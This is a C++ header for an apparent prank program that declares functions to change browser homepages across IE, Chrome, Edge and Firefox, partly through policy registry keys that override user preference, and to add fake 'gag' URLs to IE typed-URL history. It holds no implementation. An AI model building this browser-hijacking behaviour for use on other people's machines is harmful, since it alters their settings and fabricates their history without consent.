#pragma once

#include <windows.h>

// ============================================================
// Browser interaction — Internet Explorer (XP era through W10)
// plus Chromium-family (Chrome / Edge, incl. the W10 era) and
// Firefox.
//
// Homepage changes:
//   IE      -> HKCU\...\Internet Explorer\Main "Start Page"
//   Chrome  -> policy key, overrides user preference
//   Edge    -> policy key, overrides user preference
//   Firefox -> user profile prefs.js
//
// History: IE keeps the typed-URL list in HKCU "TypedURLs".
// Chromium/Firefox store history in SQLite databases that the
// running browser locks, so touching those is skipped — IE is
// still present (and reads TypedURLs) on Windows 10.
// ============================================================

namespace Browser {

// IE homepage.
bool SetIEHomepage(const wchar_t* url);

// Append one URL to the IE typed-URL history.
bool AddIETypedUrl(const wchar_t* url);

// Add `count` gag sites to the IE typed-URL history; returns how
// many were actually written.
int AddGagTypedUrls(int count);

// Chromium (Chrome + Edge) homepage via policy registry keys.
bool SetChromiumHomepage(const wchar_t* url);

// Firefox homepage through the user profile's prefs.js.
bool SetFirefoxHomepage(const wchar_t* url);

// All browsers at once; true if at least one succeeded.
bool SetAllHomepages(const wchar_t* url);

// A harmless cheerful default to use when the caller does not
// want to pick a URL itself.
const wchar_t* DefaultGagUrl();

}